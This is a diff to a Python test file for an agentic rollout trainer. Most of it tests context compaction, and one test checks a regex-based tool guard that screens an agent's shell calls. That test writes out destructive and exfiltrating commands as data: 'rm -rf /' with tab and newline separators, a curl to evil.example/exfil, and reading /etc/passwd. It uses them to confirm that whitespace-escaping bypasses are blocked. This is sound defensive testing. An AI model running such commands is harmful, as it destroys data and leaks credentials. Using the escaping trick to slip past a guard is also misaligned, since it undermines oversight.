@@ -30,6 +30,8 @@ from easydel.trainers.agentic_rollout import (
     PolicySummary,
     RegexRuleFilter,
     RolloutMessage,
+    RuleAction,
+    RuleCheck,
     SegmentKind,
     ToolDispatcher,
     TwoStageToolGuard,
@@ -241,8 +243,9 @@ def test_compaction_reduces_complete_tail_pairs_and_marks_token_ownership():
         return PolicySummary("summary", (70, 71, 72))
 
     def count_tokens(messages):
-        # system=2, resume=3, each complete pair=4. Two pairs do not fit
-        # budget 9, while one complete pair fits exactly.
+        # system=2, resume=3, each complete pair=4. With budget=12 and
+        # threshold=3 (non-retriggering target <= 9), two pairs (13) do not fit,
+        # while one complete pair (9) fits cleanly without immediately re-triggering.
         total = 0
         for message in messages:
             if message.role == "user" and "policy-generated summary" in message.content:
@@ -252,7 +255,7 @@ def test_compaction_reduces_complete_tail_pairs_and_marks_token_ownership():
         return total
 
     controller = CompactionController(
-        context_budget=9,
+        context_budget=12,
         compaction_threshold=3,
         recent_pairs=2,
         summary_instruction=summary_instruction,
@@ -261,12 +264,13 @@ def test_compaction_reduces_complete_tail_pairs_and_marks_token_ownership():
         original_system_messages=system,
         history_prefix_messages=(*system, user),
         steps=steps,
-        current_tokens=7,
+        current_tokens=10,
         policy_summarizer=summarize,
         token_counter=count_tokens,
     )
 
     assert result is not None and result.applied
+    assert controller.should_compact(count_tokens(result.context_messages)) is False
     assert len(requests) == 1
     assert requests[0].steps == steps
     assert [message.role for message in requests[0].messages[:2]] == ["system", "user"]
@@ -438,3 +442,245 @@ def test_compaction_raise_policy_rejects_context_that_cannot_fit():
             policy_summarizer=lambda request: PolicySummary("summary", (7,)),
             token_counter=lambda messages: 100,
         )
+
+
+def test_regex_rule_filter_blocks_json_escaped_whitespace_and_quotes():
+    """RegexRuleFilter must match unescaped argument values, defeating \\t/\\n/quote JSON bypasses."""
+    rule_filter = RegexRuleFilter(
+        (r"rm\s+-rf", r"curl\s+http", r'cat\s+"/etc/passwd"'),
+        match_action=RuleAction.BLOCK,
+    )
+    guard = TwoStageToolGuard(rule_filter, judge_failure_policy=JudgeFailurePolicy.ALLOW)
+    executed: list[dict] = []
+    dispatcher = ToolDispatcher({"bash": lambda **kw: executed.append(kw) or "ran"}, guard=guard)
+    context = GuardContext("episode-escape")
+
+    malicious_calls = (
+        ("bash", {"command": "rm\t-rf /"}),
+        ("bash", {"command": "rm\n-rf /"}),
+        ("bash", {"nested": [{"cmd": "curl\thttp://evil.example/exfil"}]}),
+        ("bash", {"command": 'cat "/etc/passwd"'}),
+    )
+    results = dispatcher.dispatch_many(malicious_calls, context)
+    assert all(result.blocked for result in results)
+    assert executed == []
+
+    benign = dispatcher.dispatch(("bash", {"command": "echo hello"}), context)
+    assert benign.blocked is False
+    assert len(executed) == 1
+
+
+def test_rule_check_coerces_string_action_in_two_stage_guard():
+    """Custom filters returning RuleCheck('block') must block at rule stage, not fall through to REVIEW."""
+    judge_called = False
+
+    def allow_all_judge(reviews):
+        nonlocal judge_called
+        judge_called = True
+        return [JudgeCheck("allow", "judge_ok") for _ in reviews]
+
+    def string_action_filter(call, context):
+        del context
+        if call.arguments.get("danger"):
+            return RuleCheck("block", "custom_block")  # type: ignore[arg-type]
+        return RuleCheck("allow", "custom_allow")  # type: ignore[arg-type]
+
+    guard = TwoStageToolGuard(
+        string_action_filter,
+        intent_judge=allow_all_judge,
+        judge_failure_policy=JudgeFailurePolicy.ALLOW,
+    )
+    context = GuardContext("episode-coerce")
+    blocked = guard.evaluate(normalize_tool_call(("shell", {"danger": True})), context)
+    allowed = guard.evaluate(normalize_tool_call(("shell", {"danger": False})), context)
+
+    assert blocked.action is GuardAction.BLOCK
+    assert blocked.stage == "rule"
+    assert blocked.reason_code == "custom_block"
+    assert allowed.action is GuardAction.ALLOW
+    assert allowed.stage == "rule"
+    assert judge_called is False
+
+    with pytest.raises(ValueError):
+        RuleCheck("not_an_action")  # type: ignore[arg-type]
+
+
+def test_compaction_keep_context_preserves_trainable_token_mask():
+    """Under KEEP_CONTEXT, failed/capped compactions must preserve trainable_token_mask."""
+    system = (RolloutMessage(role="system", content="sys", token_ids=(1,), trainable_token_mask=(False,)),)
+    prior_assistant = RolloutMessage(role="assistant", content="prev", token_ids=(2, 3), trainable_token_mask=(True, True))
+    step = _step(0)
+
+    controller = CompactionController(
+        context_budget=20,
+        compaction_threshold=5,
+        max_compactions=0,
+        failure_policy=CompactionFailurePolicy.KEEP_CONTEXT,
+    )
+    capped = controller.maybe_compact(
+        original_system_messages=system,
+        history_prefix_messages=(*system, prior_assistant),
+        steps=(step,),
+        current_tokens=18,
+        policy_summarizer=lambda req: PolicySummary("s", (9,)),
+        token_counter=lambda msgs: 2,
+    )
+    assert capped is not None and not capped.applied
+    assert capped.failure_code == "max_compactions"
+    # system (False,), prior_assistant (True, True), step assistant (True, True), step tool (False, False)
+    assert [m.trainable_token_mask for m in capped.context_messages] == [
+        (False,),
+        (True, True),
+        (True, True),
+        (False, False),
+    ]
+
+    failing = CompactionController(
+        context_budget=20,
+        compaction_threshold=5,
+        failure_policy=CompactionFailurePolicy.KEEP_CONTEXT,
+    )
+    failed = failing.maybe_compact(
+        original_system_messages=system,
+        history_prefix_messages=(*system, prior_assistant),
+        steps=(step,),
+        current_tokens=18,
+        policy_summarizer=lambda req: (_ for _ in ()).throw(RuntimeError("boom")),
+        token_counter=lambda msgs: 2,
+    )
+    assert failed is not None and not failed.applied
+    assert [m.trainable_token_mask for m in failed.context_messages] == [
+        (False,),
+        (True, True),
+        (True, True),
+        (False, False),
+    ]
+
+
+def test_compaction_fit_check_prevents_immediate_retrigger_thrashing():
+    """Fit check must require `not should_compact(token_count)` so compaction does not thrash next step."""
+    system = (RolloutMessage(role="system", content="sys", token_ids=(1, 2)),)
+    user = RolloutMessage(role="user", content="task", token_ids=(3,))
+    steps = (_step(0), _step(1))
+
+    # budget=10, threshold=3 -> should_compact(x) is True for x >= 8, False for x <= 7.
+    # 1 retained pair yields 9 tokens (<= budget 10, but would immediately retrigger!).
+    # 0 retained pairs yields 5 tokens (<= 7 -> does not retrigger).
+    def count_tokens(messages):
+        total = 0
+        for message in messages:
+            if message.role == "user" and "policy-generated summary" in message.content:
+                total += 3
+            else:
+                total += len(message.token_ids)
+        return total
+
+    controller = CompactionController(
+        context_budget=10,
+        compaction_threshold=3,
+        recent_pairs=1,
+        failure_policy=CompactionFailurePolicy.RAISE,
+    )
+    result = controller.maybe_compact(
+        original_system_messages=system,
+        history_prefix_messages=(*system, user),
+        steps=steps,
+        current_tokens=9,
+        policy_summarizer=lambda req: PolicySummary("short", (50,)),
+        token_counter=count_tokens,
+    )
+    assert result is not None and result.applied
+    assert result.retained_steps == ()
+    assert controller.should_compact(count_tokens(result.context_messages)) is False
+
+    # If even 0 retained pairs stays in the trigger zone (token_count=9, budget=10, threshold=3), fail.
+    with pytest.raises(CompactionError, match="context_does_not_fit"):
+        CompactionController(
+            context_budget=10,
+            compaction_threshold=3,
+            recent_pairs=1,
+            failure_policy=CompactionFailurePolicy.RAISE,
+        ).maybe_compact(
+            original_system_messages=system,
+            history_prefix_messages=(*system, user),
+            steps=steps,
+            current_tokens=9,
+            policy_summarizer=lambda req: PolicySummary("too-big", (50,)),
+            token_counter=lambda msgs: 9,
+        )
+
+
+def test_compaction_segment_ids_never_collide_with_execution_segments():
+    """SUMMARY and COPIED_TAIL segment IDs must stay strictly ordered around EXECUTION segments."""
+    system = (RolloutMessage(role="system", content="sys", token_ids=(1,)),)
+    controller = CompactionController(context_budget=20, compaction_threshold=5, recent_pairs=0)
+
+    exec0 = controller.current_execution_segment_id
+    first = controller.maybe_compact(
+        original_system_messages=system,
+        history_prefix_messages=system,
+        steps=(_step(0),),
+        current_tokens=18,
+        policy_summarizer=lambda req: PolicySummary("s0", (10,)),
+        token_counter=lambda msgs: 2,
+    )
+    exec1 = controller.current_execution_segment_id
+    second = controller.maybe_compact(
+        original_system_messages=system,
+        history_prefix_messages=first.context_messages,
+        steps=(_step(1),),
+        current_tokens=18,
+        policy_summarizer=lambda req: PolicySummary("s1", (11,)),
+        token_counter=lambda msgs: 2,
+    )
+    exec2 = controller.current_execution_segment_id
+
+    ids = [
+        exec0,
+        first.segments[0].segment_id,
+        first.segments[1].segment_id,
+        exec1,
+        second.segments[0].segment_id,
+        second.segments[1].segment_id,
+        exec2,
+    ]
+    assert ids == [0, 1, 2, 3, 4, 5, 6]
+    assert len(set(ids)) == len(ids)
+
+    # Explicit next_segment_id override is also respected.
+    override_controller = CompactionController(context_budget=20, compaction_threshold=5, recent_pairs=0)
+    custom = override_controller.maybe_compact(
+        original_system_messages=system,
+        history_prefix_messages=system,
+        steps=(_step(0),),
+        current_tokens=18,
+        policy_summarizer=lambda req: PolicySummary("s", (10,)),
+        token_counter=lambda msgs: 2,
+        next_segment_id=10,
+    )
+    assert [seg.segment_id for seg in custom.segments] == [10, 11]
+
+
+def test_compaction_resume_template_handles_braces_in_summary_and_template():
+    """Braces inside summary text or unescaped braces in resume_template must not crash."""
+    system = (RolloutMessage(role="system", content="sys", token_ids=(1,)),)
+    summary_with_braces = 'State JSON: {"done": true, "next": "{step_2}"}'
+
+    controller = CompactionController(
+        context_budget=20,
+        compaction_threshold=5,
+        recent_pairs=0,
+        resume_template='Context {"version": 1}:\n{summary}\n{extra_brace_field}',
+    )
+    result = controller.maybe_compact(
+        original_system_messages=system,
+        history_prefix_messages=system,
+        steps=(_step(0),),
+        current_tokens=18,
+        policy_summarizer=lambda req: PolicySummary(summary_with_braces, (99,)),
+        token_counter=lambda msgs: 2,
+    )
+    assert result is not None and result.applied
+    resumed = result.context_messages[1].content
+    assert summary_with_braces in resumed
+    assert '{"version": 1}' in resumed
